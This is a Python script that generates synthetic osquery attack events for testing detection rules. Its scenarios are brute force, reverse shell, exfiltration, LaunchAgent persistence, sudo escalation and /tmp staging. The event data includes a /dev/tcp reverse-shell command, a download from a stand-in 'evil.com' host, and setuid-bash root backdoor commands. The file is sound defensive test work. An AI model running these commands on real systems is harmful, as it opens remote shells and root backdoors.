"""
Generate synthetic attack events for testing detection rules.

Scenarios:
1. SSH brute force (10 failed logins, then success)
2. Reverse shell (bash process with /dev/tcp connection)
3. Data exfiltration (large outbound transfer to rare IP)
4. Persistence (new LaunchAgent created)
5. Privilege escalation (sudo to root)
6. Data staging in /tmp
"""
import json
import random
import argparse
from datetime import datetime, timezone, timedelta
from pathlib import Path


def generate_brute_force(host: str = "test-mac.local", attacker_ip: str = None) -> list[dict]:
    """Generate 10 failed SSH logins followed by 1 success."""
    if attacker_ip is None:
        attacker_ip = f"185.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    events = []
    base_time = datetime.now(tz=timezone.utc) - timedelta(minutes=5)
    
    # Failed attempts
    for i in range(10):
        events.append({
            "name": "logged_in_users",
            "hostIdentifier": host,
            "unixTime": int((base_time + timedelta(seconds=i*30)).timestamp()),
            "calendarTime": (base_time + timedelta(seconds=i*30)).strftime("%a %b %d %H:%M:%S %Y UTC"),
            "columns": {
                "type": "failed",
                "user": "admin",
                "host": attacker_ip,
            },
            "action": "added",
        })
    
    # Successful login
    events.append({
        "name": "logged_in_users",
        "hostIdentifier": host,
        "unixTime": int((base_time + timedelta(minutes=5)).timestamp()),
        "calendarTime": (base_time + timedelta(minutes=5)).strftime("%a %b %d %H:%M:%S %Y UTC"),
        "columns": {
            "type": "user",
            "user": "admin",
            "host": attacker_ip,
        },
        "action": "added",
    })
    
    return events


def generate_reverse_shell(host: str = "test-mac.local") -> list[dict]:
    """Generate reverse shell process events."""
    events = []
    base_time = datetime.now(tz=timezone.utc) - timedelta(minutes=2)
    
    # Bash process with /dev/tcp
    events.append({
        "name": "processes",
        "hostIdentifier": host,
        "unixTime": int(base_time.timestamp()),
        "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
        "columns": {
            "pid": str(random.randint(1000, 9999)),
            "name": "bash",
            "path": "/bin/bash",
            "cmdline": "bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'",
            "uid": "0",
        },
        "action": "added",
    })
    
    # Socket connection
    events.append({
        "name": "open_sockets",
        "hostIdentifier": host,
        "unixTime": int(base_time.timestamp()),
        "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
        "columns": {
            "pid": str(random.randint(1000, 9999)),
            "remote_address": "192.168.1.100",
            "remote_port": "4444",
            "local_address": "10.0.0.5",
            "local_port": str(random.randint(40000, 60000)),
            "protocol": "6",  # TCP
        },
        "action": "added",
    })
    
    return events


def generate_data_exfiltration(host: str = "test-mac.local") -> list[dict]:
    """Generate data exfiltration network events."""
    events = []
    base_time = datetime.now(tz=timezone.utc) - timedelta(minutes=10)
    
    # Multiple connections to rare external IP
    for i in range(50):
        events.append({
            "name": "open_sockets",
            "hostIdentifier": host,
            "unixTime": int((base_time + timedelta(seconds=i*10)).timestamp()),
            "calendarTime": (base_time + timedelta(seconds=i*10)).strftime("%a %b %d %H:%M:%S %Y UTC"),
            "columns": {
                "pid": str(random.randint(1000, 9999)),
                "remote_address": f"45.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "remote_port": "31337",
                "local_address": "10.0.0.5",
                "local_port": str(random.randint(40000, 60000)),
                "protocol": "6",
            },
            "action": "added",
        })
    
    return events


def generate_persistence(host: str = "test-mac.local") -> list[dict]:
    """Generate LaunchAgent persistence events."""
    events = []
    base_time = datetime.now(tz=timezone.utc) - timedelta(minutes=3)
    
    # File event for LaunchAgent creation
    events.append({
        "name": "file_events",
        "hostIdentifier": host,
        "unixTime": int(base_time.timestamp()),
        "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
        "columns": {
            "target_path": "/Users/admin/Library/LaunchAgents/com.apple.update.plist",
            "action": "CREATED",
            "uid": "501",
            "mode": "0644",
        },
        "action": "added",
    })
    
    # Process event for launchctl
    events.append({
        "name": "processes",
        "hostIdentifier": host,
        "unixTime": int((base_time + timedelta(seconds=30)).timestamp()),
        "calendarTime": (base_time + timedelta(seconds=30)).strftime("%a %b %d %H:%M:%S %Y UTC"),
        "columns": {
            "pid": str(random.randint(1000, 9999)),
            "name": "launchctl",
            "path": "/bin/launchctl",
            "cmdline": "launchctl load /Users/admin/Library/LaunchAgents/com.apple.update.plist",
            "uid": "501",
        },
        "action": "added",
    })
    
    return events


def generate_privilege_escalation(host: str = "test-mac.local") -> list[dict]:
    """Generate privilege escalation via sudo."""
    events = []
    base_time = datetime.now(tz=timezone.utc) - timedelta(minutes=2)
    
    commands = [
        "sudo -l",
        "sudo whoami",
        "sudo su -",
        "sudo chmod u+s /bin/bash",
        "sudo cp /bin/bash /tmp/rootbash",
        "sudo chown root:root /tmp/rootbash",
    ]
    
    for i, cmd in enumerate(commands):
        events.append({
            "name": "shell_history",
            "hostIdentifier": host,
            "unixTime": int((base_time + timedelta(seconds=i*10)).timestamp()),
            "calendarTime": (base_time + timedelta(seconds=i*10)).strftime("%a %b %d %H:%M:%S %Y UTC"),
            "columns": {
                "username": "admin",
                "command": cmd,
                "history_file": "/Users/admin/.zsh_history",
            },
            "action": "added",
        })
    
    return events


def generate_tmp_staging(host: str = "test-mac.local") -> list[dict]:
    """Generate suspicious process from /tmp."""
    events = []
    base_time = datetime.now(tz=timezone.utc) - timedelta(minutes=1)
    
    events.append({
        "name": "processes",
        "hostIdentifier": host,
        "unixTime": int(base_time.timestamp()),
        "calendarTime": base_time.strftime("%a %b %d %H:%M:%S %Y UTC"),
        "columns": {
            "pid": str(random.randint(1000, 9999)),
            "name": "suspicious",
            "path": "/tmp/suspicious",
            "cmdline": "/tmp/suspicious --download http://evil.com/payload",
            "uid": "501",
        },
        "action": "added",
    })
    
    return events


def write_events_to_file(events: list[dict], output_path: str) -> None:
    """Write events to JSONL file."""
    with open(output_path, "a") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")


def main():
    parser = argparse.ArgumentParser(description="Generate synthetic attack data")
    parser.add_argument("--scenario", choices=[
        "brute-force",
        "reverse-shell",
        "exfiltration",
        "persistence",
        "privilege-escalation",
        "tmp-staging",
        "all",
    ], default="all", help="Attack scenario to generate")
    parser.add_argument("--output", default="/var/log/osquery/attack_simulation.log",
                        help="Output file path")
    parser.add_argument("--host", default="test-mac.local", help="Target hostname")
    
    args = parser.parse_args()
    
    print(f"Generating {args.scenario} attack scenario...")
    
    all_events = []
    
    if args.scenario in ["brute-force", "all"]:
        all_events.extend(generate_brute_force(args.host))
        print("  + Brute force events")
    
    if args.scenario in ["reverse-shell", "all"]:
        all_events.extend(generate_reverse_shell(args.host))
        print("  + Reverse shell events")
    
    if args.scenario in ["exfiltration", "all"]:
        all_events.extend(generate_data_exfiltration(args.host))
        print("  + Data exfiltration events")
    
    if args.scenario in ["persistence", "all"]:
        all_events.extend(generate_persistence(args.host))
        print("  + Persistence events")
    
    if args.scenario in ["privilege-escalation", "all"]:
        all_events.extend(generate_privilege_escalation(args.host))
        print("  + Privilege escalation events")
    
    if args.scenario in ["tmp-staging", "all"]:
        all_events.extend(generate_tmp_staging(args.host))
        print("  + /tmp staging events")
    
    # Write to file
    write_events_to_file(all_events, args.output)
    
    print(f"\nGenerated {len(all_events)} events to {args.output}")
    print("\nTo ingest these events, either:")
    print(f"  1. Copy to osquery log: sudo cp {args.output} /var/log/osquery/osqueryd.results.log")
    print(f"  2. Use HTTP API: curl -X POST http://localhost:8000/api/v1/ingest ...")


if __name__ == "__main__":
    main()
